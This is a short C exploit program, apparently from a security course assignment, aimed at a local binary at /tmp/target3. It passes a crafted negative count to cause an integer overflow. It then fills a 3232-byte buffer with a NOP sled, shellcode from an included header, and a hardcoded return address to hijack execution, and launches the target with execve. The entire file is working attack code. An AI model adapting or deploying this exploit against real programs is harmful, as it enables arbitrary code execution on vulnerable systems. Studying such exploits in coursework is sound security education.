
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define NOP 0x90

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  
  // sizeof widget * 100 + edp override
  char le_buffer[3232];
  char *count;
  int i;
  int addr;

  addr = 0xbfffe548;
  count = "-2147483547";

  for (i = 0; i < 3220; i ++) {
    if( i < strlen(count)) {
	*(le_buffer + i) = count[i];
    } else if (i < strlen(count)+1) {
	*(le_buffer + i) = ',';
    } else if (i < 3212-strlen(shellcode)) {
        *(le_buffer + i) = NOP; 
    } else if (i < 3212) {
        *(le_buffer + i) = shellcode[i-3212+strlen(shellcode)];
    } else {
        *(le_buffer + i) = addr >> ((i - 3212) * 8);
    }
  }

  args[0] = TARGET;
  args[1] = le_buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
